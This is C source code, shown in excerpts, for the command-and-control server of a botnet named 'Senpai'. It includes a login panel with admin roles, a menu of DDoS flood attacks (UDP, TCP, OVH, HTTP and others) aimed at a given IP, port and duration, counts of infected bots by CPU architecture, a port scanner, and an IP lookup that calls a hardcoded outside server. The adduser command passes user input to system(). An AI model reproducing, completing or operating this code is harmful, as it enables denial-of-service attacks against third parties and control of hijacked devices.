...
void broadcast(char *msg, int us, char *sender, int fuck, int amt2send, int thefd)
{
        ...
        for(i = 0; i < amt2send; i++)
        {
                ...
                {
                    char *message[1024];
                    snprintf(message, sizeof(message), "\r\n\x1b[0;36mAdmin(%s) Logged In\x1b[37m", sender);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, message, strlen(message), MSG_NOSIGNAL);
                    snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"CYAN"%s"GRAY"@"CYAN"Senpai\x1b[0m#\x1b[0;36m: \x1b[0m", managements[i].nickname);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
                    memset(message, 0, sizeof(message));
                ...
                else
                {
                    ...
                    {
                        send(i, "\n", 1, MSG_NOSIGNAL);
                        send(i, "\x1b[0;36m", strlen("\x1b[0;36m"), MSG_NOSIGNAL);
...
void *titleWriter(void *sock) 
{
        ...
        while(1)
        {
            ...
            sprintf(string, "%c]0; Devices Repping: %d | Users Online: %d %c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *arguments)
{
        ...
        sprintf(gang, "%c]0; Verification %c", '\033', '\007');
        sprintf(login1,  "\x1b[96mWelcome To \x1b[0;97m%s \x1b[96m| \x1b[96mVersion \x1b[0;97m%s \x1b[0m| \x1b[96mBy \x1b[0;97m%s\x1b[0m\r\n", ss_name, ss_ver, ss_copyright);
        sprintf(login2,  "\x1b[0;97mRespect Others + Device Count\x1b[0m\r\n");
        sprintf(login3,  "\x1b[0;97mNo Spamming!\x1b[0m\r\n");
        sprintf(login4,  "\x1b[0;97mDO \x1b[31mNOT \x1b[0;36mBreak Attack Limit!\x1b[0m\r\n\r\n");
        sprintf(login5,  "\x1b[96mEnter Credentials To Join\x1b[0m\r\n");
        ...
        if(send(thefd, "\x1b[0;96mUsername\x1b[0;36m:", 23, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(thefd, "\x1b[0;96mPassword\x1b[0;36m:", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        ...
        if(!strcmp(accounts[find_line].type, "admin"))
        {
            ...
            printf("\x1b[0;36mAdmin(\x1b[0;36m%s\x1b[0;36m:\x1b[0;36m%s\x1b[0;36m) Logged In\x1b[0m\n", accounts[find_line].id, management_ip);
        }
        else if(!strcmp(accounts[find_line].type, "superadmin"))
        {
            managements[thefd].adminstatus = 2;
            broadcast(buf, thefd, accounts[find_line].id, 3, MAXFDS, thefd);
            printf("\x1b[0;36mSuperAdmin(\x1b[0;36m%s\x1b[0;36m:\x1b[0;36m%s\x1b[0;36m) Logged In\x1b[0m\n", accounts[find_line].id, management_ip);
        }
        else
        {
            managements[thefd].adminstatus = 0;
            broadcast(buf, thefd, accounts[find_line].id, 1, MAXFDS, thefd);
            printf("\x1b[0;36m%s:%s Logged In\x1b[0m\n", accounts[find_line].id, management_ip);
        }
        /*char *ohoklol[200];
        ...
        snprintf(line1, sizeof(line1), "\x1b[0;93m[\x1b[0m+\x1b[0;93m] \x1b[0;36mAccess Granted\x1b[0m\r\n");
        snprintf(line2, sizeof(line2), "\x1b[0;93m[\x1b[0m+\x1b[0;93m] Welcome \x1b[0m%s\x1b[0;97m to %s This Is Real Power...\x1b[0m\x1b[0m\r\n", accounts[find_line].id, ss_name);
        snprintf(line3, sizeof(line3), "");
        snprintf(line4, sizeof(line4), "\x1b[0;93m[\x1b[0m+\x1b[0;93m] Setting up %s terminal\x1b[0m...\r\n\r\n", ss_name);
        snprintf(line5, sizeof(line5), "");
        snprintf(line6, sizeof(line6), "\r\n"CYAN"%s"GRAY"@"CYAN"Senpai\x1b[0m#\x1b[0;36m: "C_RESET, accounts[find_line].id);
        ...
        sprintf(ascii_banner_line8,   "\e[36m                   \e[95m[\e[97m+\e[95m]\e[97mようこそ\e[36m \033[32;1m\e[97mTo The Senpai Botnet\e[95m[\e[97m+\e[95m]\r\n");
        sprintf(ascii_banner_line9,   "\e[36m                  \e[95m[\e[97m+\e[95m]\e[97mヘルプを入力してヘルプを表示する\e[95m[\e[97m+\e[95m]\r\n\x1b[0m\r\n");
        sprintf(ascii_banner_line10,  "\e[95m                            MOTD\e[97m %s\e[95m\r\n", motd1);
        ...
        {  
            sprintf(botnet, "\x1b[95m[\x1b[97m+\x1b[95m]\x1b[36m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★\x1b[95m[\x1b[97m+\x1b[95m]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m                         コマンドのメニュー                       \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . UDP [IP] [PORT] [TIME] 32 0 10          \x1b[36m★ UDP Flood            \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . TCP [IP] [PORT] [TIME] 32 [FLAGS] 0 10  \x1b[36m★ TCP Flood            \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . CNC [IP] [PORT] [TIME]                  \x1b[36m★ CNC Crash Flood      \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . STD [IP] [PORT] [TIME]                  \x1b[36m★ STD Flood            \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . CRASH [IP] [PORT] [TIME] 32 1024 10     \x1b[36m★ CRASH Flood          \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . ACK [IP] [PORT] [TIME] 32 1024 10       \x1b[36m★ ACK Flood            \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . LYNX [IP] [PORT] [TIME] 32 1024 10      \x1b[36m★ LYNX Flood           \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . SMITE [IP] [PORT] [TIME] 32 1024 10     \x1b[36m★ SMITE Flood          \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . UDPBYPASS [IP] [PORT] [TIME] [PSIZE]    \x1b[36m★ UDPBYPASS Method     \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . OVH [IP] [PORT] [TIME]                  \x1b[36m★ OVH Hex Flood        \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m . HTTP URL PORT TIME THREADS METHOD       \x1b[36m★ HTTP Method          \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m >---\x1b[35mServerside Commands\x1b[97m---<               \x1b[36m★                      \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m ONLINE?                                   \x1b[36m★ Shows Online Users   \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m BOTS                                      \x1b[36m★ Shows Botcount       \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m KILLED                                    \x1b[36m★ Shows Killed Procs   \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m CHAT MUTE                                 \x1b[36m★ . MUTE ON |. MUTE OFF\x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m ADMIN and SUPER                           \x1b[36m★ ADMIN | SUPER        \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m TOOLS                                     \x1b[36m★ Shows Tools          \x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[36m ★\x1b[97m SERVER                                    \x1b[36m★ Shows Serverside coms\x1b[36m★\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[95m[\x1b[97m+\x1b[95m]\x1b[36m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★\x1b[95m[\x1b[97m+\x1b[95m]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        ...
        {  
            ...
            {
                sprintf(botnet, "\x1b[0;36musers [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", managesConnected);
            ...
            else
            {
                ...
                if(ppc != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.powerpc [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", ppc);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sh4 != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.sh4 [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", sh4);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(x86 != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.x86 [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", x86);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv4 != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.armv4 [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", armv4);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv5 != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.armv5 [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", armv5);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv6 != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.armv6 [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", armv6);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv7 != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.armv7 [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", armv7);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mips != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.mips [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", mips);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(m68k != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.m68k [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", m68k);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(debug != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.debug [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", debug);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sparc != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.sparc [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", sparc);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mipsel != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.mipsel [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", mipsel);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(boxes != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.servers [\x1b[97m%d\x1b[0;36m]\r\n\x1b[0m", boxes);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(pmalinux != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.pma.linux [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", pmalinux);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(pmawindows != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.pma.windows [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", pmawindows);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown != 0)
                {
                    sprintf(botnet, "\x1b[0;36mSenpai.unknown [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", unknown);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(botnet, "\x1b[0;36mTotal: [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(accounts[find_line].maxbots < clientsConnected())
                {
                    sprintf(botnet, "\x1b[0;36mAvailable Bots [\x1b[0m%d\x1b[0;36m]\r\n\x1b[0m", accounts[find_line].maxbots);
                }
        ...
        else if(strstr(buf, "iplookup ") || strstr(buf, "IPLOOKUP "))
        {
            ...
            if(atoi(myhost) >= 8)
            {
                ...
                char *iplookup_host = "104.168.96.137"; // Change to Server IP
                ...
                else
                {
                    ...
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        ...
                        sprintf(botnet, "\x1b[0m[\x1b[0;36mIPLookup\x1b[0m] \x1b[0;36mGetting Info For -> %s...\r\n", myhost);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        ...
                        else sprintf(botnet, "\x1b[0;36m[+]--- \x1b[0mResults\x1b[0;36m ---[+]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
        ...
        else if(strstr(buf, ". unmute") || strstr(buf, ". UNMUTE"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                ...
                sprintf(botnet, "\x1b[0;36m%s \x1b[32mYou've Forced Unmute on All Clients.\x1b[37m\r\n", managements[thefd].nickname);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
        ...
        else if(strstr(buf, "killed") || strstr(buf, "KILLED"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                sprintf(botnet, "\x1b[0;36mBot Process's Killed: [\x1b[0m%d\x1b[0;36m]\x1b[37m\r\n", bot_procs_killed);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
        ...
        else if(strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
        {
            ...
            trim(url);
            resolvehttp(url, ip);
            printf("\x1b[0;36m[\x1b[0mResolver\x1b[0;36m] %s -> %s\n", url, ip);
            sprintf(botnet, "\x1b[0;36m[\x1b[0mResolver\x1b[0;36m] %s -> %s\r\n", url, ip);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "PORTSCAN ") || strstr(buf, "portscan "))
        {
            ...
            snprintf(botnet, sizeof(botnet), "\x1b[0;36m[\x1b[0mPortscanner\x1b[0;36m] \x1b[0mChecking ports \x1b[0;36m%d-%d \x1b[0mon -> \x1b[0;36m%s...\x1b[0m\r\n", least_port, max_port, host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                ...
                {
                    snprintf(botnet, sizeof(botnet), "\x1b[0;36m[\x1b[0mPortscanner\x1b[0;36m] %d \x1b[0mis open on \x1b[0;36m%s!\x1b[0m\r\n", x, host);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    memset(botnet, 0, sizeof(botnet));
                    close(Sock);
                }
            }
            snprintf(botnet, sizeof(botnet), "\x1b[0;36m[\x1b[0mPortscanner\x1b[0;36m] \x1b[32mScan on \x1b[0;36m%s \x1b[32mfinished.\x1b[0m\r\n", host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                ...
                system(uinfo);
                printf("\x1b[0;36m%s\x1b[0m added user[\x1b[0;36m%s\x1b[0m]\n", accounts[find_line].id, userinfo);
                sprintf(botnet, "\x1b[0;36m%s\x1b[0m added user[\x1b[0;36m%s\x1b[0m]\r\n", accounts[find_line].id, userinfo);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
            ...
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                ...
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    ...
                    for(id=0; id < MAXFDS; id++)
                    {
                        ...
                        {
                            sprintf(botnet, "\n\x1b[31mGoodbye, kicked by \x1b[0;36m%s\x1b[0m...\r\n", managements[thefd].nickname);
                            if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            managements[id].connected = 0;
                            close(id);
                            //managesConnected -= 1;
                            sprintf(botnet, "\x1b[0;36mKicked \x1b[0;36m%s\x1b[0m...\r\n", user);
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID="))
                {
                    ...
                    close(uid);
                    //managesConnected -= 1;
                    sprintf(botnet, "\x1b[0;36mKicked user with ID # \x1b[0;36m%d\x1b[0m...\r\n", uid);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
            else
            ...
            if(managements[thefd].adminstatus == 2) // 2 = superadmin
            {
                ...
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    ...
                    else
                    {
                        ...
                        sprintf(botnet, "\n\x1b[31mGoodbye, banned by \x1b[0;36m%s\x1b[0m...\r\n", managements[thefd].nickname);
                        if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        managements[id].connected = 0;
                        close(id);
                        sprintf(botnet, "\x1b[0;36mBanned \x1b[0;36m%s\x1b[0m...\r\n", iusername);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID="))
                {
                    ...
                    close(uid);
                    sprintf(botnet, "\x1b[0;36mBanned user with ID # %d\x1b[0m...\r\n", uid);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else if(strstr(buf, "ip=") || strstr(buf, "IP="))
                {
                    ...
                    for(kx=0; kx < MAXFDS; kx++)
                    {
                        if(!strcmp(managements[kx].ip, target))
                        {
                            ...
                            managements[kx].connected = 0;
                            close(kx);
                            sprintf(botnet, "\x1b[0;36mBanned user with IP %d\x1b[0m...\r\n", target);
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
        ...
        {
            int k;
            strcpy(botnet, "\x1b[0;36m- \x1b[97mOnline Users \x1b[0;36m-\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(k=0; k < MAXFDS; k++)
            {
                if(strlen(managements[k].nickname) > 1 && managements[k].connected == 1)
                {
                    sprintf(botnet, "\x1b[0;36mID(%d) \x1b[0;36m%s\x1b[0m\r\n", k, managements[k].nickname);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
        }
        ...
        {           
            ...
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║ IP Lookup \x1b[97m- \x1b[0mIPLOOKUP [TARGET]    \x1b[0;36m║\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m╚══════════════════════════════════╝\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        ...
        {           
            sprintf(botnet, "\x1b[0;36m╔═══════════════════════════════════╗\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║ BOTS \x1b[97m- \x1b[0mShows Bot Count/Arch       \x1b[0;36m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║ KILLED \x1b[97m- \x1b[0mShows Killed Processes   \x1b[0;36m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║ Online? \x1b[97m- \x1b[0mShows Online Users      \x1b[0;36m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║ CLS \x1b[97m- \x1b[0mClears Screen               \x1b[0;36m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m║ Chat Mute \x1b[97m- \x1b[0m. MUTE ON |. MUTE OFF \x1b[0;36m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0;36m╚═══════════════════════════════════╝\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        if (strncmp(buf, ". UDP", 3) == 0 || strncmp(buf, ". TCP", 3) == 0 || strncmp(buf, ". CNC", 3) == 0 || strncmp(buf, ". STD", 3) == 0 || strncmp(buf, ". HTTP", 3) == 0 || strncmp(buf, ". CRASH", 3) == 0 || strncmp(buf, ". SMITE", 3) ==0 || strncmp(buf, ". OVH", 3) ==0 || strncmp(buf, ". UDPBYPASS", 3) ==0)
        {
        ...
        {  
            ...
            {           
                sprintf(botnet, "\x1b[0;36m╔════════════════════════════════════════════════════════════════╗\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║ Force Unmute All \x1b[97m- \x1b[0m. UNMUTE                                    \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║ Kick \x1b[97m- \x1b[0m. KICK USER=[USERNAME] | . KICK ID=[ID#]                \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║ Add User \x1b[97m- \x1b[0mADDUSER [USER] [PASS] [TYPE(admin/common)] [PLAN]   \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m║ SUPER \x1b[97m- \x1b[0;36mShows Super Admin Commands                             \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1b[0;36m╚════════════════════════════════════════════════════════════════╝\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        ...
        {           
            if(managements[thefd].adminstatus ==2)
            {
                sprintf(botnet, "\x1b[0;36m╔══════════════════════════════════════════════════╗\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m║ Connection Ban \x1b[97m- \x1b[0m. BAN IP=[IP]                   \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m║ User Ban \x1b[97m- \x1b[0m. BAN USER=[USER] | . BAN ID=[ID#]    \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m║ \x1b[0m(User/ID Ban Resolves and Bans Their IP Address) \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m║ Unban \x1b[97m- \x1b[0m. UNBAN IP=[IP]                          \x1b[0;36m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1b[0;36m╚══════════════════════════════════════════════════╝\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            }
        ...
        else if(strstr(buf, "CLS") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "clear"))
        {
            ...
            managements[thefd].connected = 1;
                ...
                trim(buf);
                char *okstring[200];
                snprintf(okstring, sizeof(okstring), ""CYAN"%s"GRAY"@"CYAN"Senpai\x1b[0m#\x1b[0;36m: \x1b[0m", accounts[find_line].id);
        ...
        if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
        {
            ...
            printf("\x1b[0;36mAdmin(\x1b[0m%s\x1b[0;36m:%s\x1b[0;36m) \x1b[31mLogged Out\x1b[0m.\n", accounts[find_line].id, management_ip);
        }
        else
        {
            broadcast(buf, thefd, usernamez, 2, MAXFDS, thefd);
            printf("\x1b[0;36m%s\x1b[0m:\x1b[0;36m%s \x1b[31mLogged Out\x1b[0m.\n", accounts[find_line].id, management_ip);
        }
...
int main (int argc, char *argv[], void *sock)
{
        ...
        printf("      [\x1b[0;36mGoon gang Runs Your Shit!\x1b[0m]\n   -----------------------\n");
        ...
        while(1)
        {
                broadcast("PING", -1, "Senpai", 0, MAXFDS, 0);
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
